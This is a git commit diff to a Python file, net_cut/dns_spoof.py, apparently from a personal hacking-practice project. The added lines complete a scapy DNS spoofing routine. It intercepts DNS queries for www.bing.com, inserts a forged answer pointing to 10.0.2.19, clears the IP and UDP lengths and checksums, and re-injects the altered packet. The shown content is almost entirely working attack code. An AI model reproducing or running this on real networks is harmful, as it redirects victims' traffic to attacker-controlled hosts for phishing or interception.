905588063b781614d761e63789aa1dab287a03d0
DungeOnMster <rishabh98@gmail.com>
2020-11-04 00:13:27 -0500

    4 nov/2020

--- net_cut/dns_spoof.py
+++ net_cut/dns_spoof.py
@@ -11,6 +11,15 @@ def process_packet(packet):
         if "www.bing.com" in qname:
             print("[+] Spoofing target")
             ans = scapy.DNSRR(rrname=qname, rdata="10.0.2.19")
+            scapy_packet[scapy.DNS].an = ans
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+
+            packet.set_payload(str(scapy_packet))
     packet.accept()
 
 
